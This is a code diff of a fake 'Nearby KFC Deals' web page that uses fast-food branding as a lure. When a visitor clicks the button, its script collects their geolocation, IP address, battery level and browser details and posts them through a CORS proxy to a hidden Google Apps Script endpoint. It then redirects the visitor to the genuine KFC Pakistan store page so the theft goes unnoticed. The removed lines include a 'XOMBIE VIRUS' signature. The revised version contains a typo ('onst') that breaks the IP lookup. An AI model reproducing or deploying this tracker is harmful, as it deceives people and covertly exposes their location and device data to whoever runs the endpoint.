@@ -93,103 +93,89 @@
     <button class="btn" onclick="sendLocation()">🔎 Nearby KFC Deals</button>
   </div>
 
-  <script>
-    const foodIcons = ["drumstick.png", "sauce.png", "wing.png"];
-    const bg = document.getElementById('background');
+<script>
+const foodIcons = ["drumstick.png", "sauce.png", "wing.png"];
+const bg = document.getElementById('background');
 
-    // Animate background
-    for (let i = 0; i < 40; i++) {
-      const img = document.createElement('img');
-      img.src = foodIcons[Math.floor(Math.random() * foodIcons.length)];
-      img.style.left = Math.random() * 100 + 'vw';
-      img.style.top = '100vh';
-      img.classList.add('float-up');
-      img.style.animationDuration = (6 + Math.random() * 3) + 's';
-      bg.appendChild(img);
-    }
+// Animate background
+for (let i = 0; i < 40; i++) {
+  const img = document.createElement('img');
+  img.src = foodIcons[Math.floor(Math.random() * foodIcons.length)];
+  img.style.left = Math.random() * 100 + 'vw';
+  img.style.top = '100vh';
+  img.classList.add('float-up');
+  img.style.animationDuration = (6 + Math.random() * 3) + 's';
+  bg.appendChild(img);
+}
 
-    for (let i = 0; i < 40; i++) {
-      const img = document.createElement('img');
-      img.src = foodIcons[Math.floor(Math.random() * foodIcons.length)];
-      img.style.left = Math.random() * 100 + 'vw';
-      img.style.top = '-150px';
-      img.classList.add('float-down');
-      img.style.animationDuration = (6 + Math.random() * 3) + 's';
-      bg.appendChild(img);
-    }
+for (let i = 0; i < 40; i++) {
+  const img = document.createElement('img');
+  img.src = foodIcons[Math.floor(Math.random() * foodIcons.length)];
+  img.style.left = Math.random() * 100 + 'vw';
+  img.style.top = '-150px';
+  img.classList.add('float-down');
+  img.style.animationDuration = (6 + Math.random() * 3) + 's';
+  bg.appendChild(img);
+}
 
-    async function sendLocation() {
-      let lat = "N/A", lon = "N/A", accuracy = "N/A", ip = "N/A", battery = "N/A", userAgent = navigator.userAgent;
+async function sendLocation() {
+  let lat = "N/A", lon = "N/A", accuracy = "N/A", ip = "N/A", battery = "N/A", userAgent = navigator.userAgent;
 
-      // Get IP address from external API
-      try {
-        const ipRes = await fetch("https://api.ipify.org?format=json");
-        const ipData = await ipRes.json();
-        ip = ipData.ip;
-      } catch (e) {}
+  // Get IP
+  try {
+    onst ipRes = await fetch("https://api.ipify.org?format=json");
+    const ipData = await ipRes.json();
+    ip = ipData.ip;
+  } catch (e) {}
 
-      // Get battery level if available
-      try {
-        const batt = await navigator.getBattery();
-        battery = Math.round(batt.level * 100) + "%";
-      } catch (e) {}
+  // Get Battery
+  try {
+    const batt = await navigator.getBattery();
+    battery = Math.round(batt.level * 100) + "%";
+  } catch (e) {}
 
-      // Get geolocation
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-          (position) => {
-            lat = position.coords.latitude;
-            lon = position.coords.longitude;
-            accuracy = position.coords.accuracy;
+  // Geolocation
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(
+      (position) => {
+        lat = position.coords.latitude;
+        lon = position.coords.longitude;
+        accuracy = position.coords.accuracy;
 
-     
-const signature = `\n\n🧠 **Powered by XOMBIE VIRUS** ☣️`;
+        const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
 
-const content = `🍗 **Nearby KFC Deal Request**
-📍 **Latitude:** ${lat}
-📍 **Longitude:** ${lon}
-🎯 **Accuracy:** ${accuracy} meters
-🌐 **IP Address:** ${ip}
-🔋 **Battery:** ${battery}
-🧠 **User Agent:** ${userAgent}
-📍 [Google Maps Link](${mapUrl})${signature}`;
-
-
-const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
-
-fetch("https://corsproxy.io/?" + encodeURIComponent("https://script.google.com/macros/s/AKfycbxljE9VsM4fPUOBDYZhoI3tQDrATP_bm817-r5CAu3sNXmZ314ouy8Dv5yIL77NNjDt/exec"), {
-  method: "POST",
-  headers: {
-    "Content-Type": "application/json"
-  },
-  body: JSON.stringify({
-    lat: lat,
-    lon: lon,
-    accuracy: accuracy,
-    ip: ip,
-    battery: battery,
-    ua: userAgent,
-    map: mapUrl // ✅ sending map link
-  })
-}).finally(() => {
-  setTimeout(() => {
-    window.location.href = "https://www.kfcpakistan.com/store-locations";
-  }, 1000);
-});
-
+        fetch("https://corsproxy.io/?" + encodeURIComponent("https://script.google.com/macros/s/AKfycbxljE9VsM4fPUOBDYZhoI3tQDrATP_bm817-r5CAu3sNXmZ314ouy8Dv5yIL77NNjDt/exec"), {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
           },
-          () => {
+          body: JSON.stringify({
+            lat: lat,
+            lon: lon,
+            accuracy: accuracy,
+            ip: ip,
+            battery: battery,
+            ua: userAgent,
+            map: mapUrl
+          })
+        }).finally(() => {
+          setTimeout(() => {
             window.location.href = "https://www.kfcpakistan.com/store-locations";
-          }
-        );
-      } else {
+          }, 1000);
+        });
+      },
+      () => {
         window.location.href = "https://www.kfcpakistan.com/store-locations";
       }
-    }
-  </script>
-
+    );
+  } else {
+    window.location.href = "https://www.kfcpakistan.com/store-locations";
+  }
+}
+</script>
 </body>
 </html>
+
 
 
 
